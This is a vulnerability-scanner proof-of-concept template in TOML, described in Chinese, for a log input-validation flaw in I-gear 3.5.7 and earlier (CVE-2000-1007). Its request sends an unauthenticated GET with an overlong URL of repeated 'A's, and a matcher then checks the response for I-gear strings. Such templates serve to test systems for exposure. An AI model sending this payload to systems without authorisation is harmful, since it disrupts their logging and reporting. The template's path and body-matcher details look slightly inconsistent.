[info]
author = "AVE"
description = "通过发送超长URL（超过255字符）的HTTP GET请求，验证I-gear 3.5.7及更早版本是否存在日志处理缺陷。攻击者无需认证即可远程触发，导致日志记录和报告功能异常。"
id = "POC-AVE-2000-1046"
name = "I-gear 超长URL日志输入验证漏洞 PoC"
severity = "medium"
tags = ["ave-2000-1046"]
vuln_id = [
    "CVE-2000-1007",
    "AVE-2000-1046",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "I-gear",
    "Igear",
    "Server: I",
]
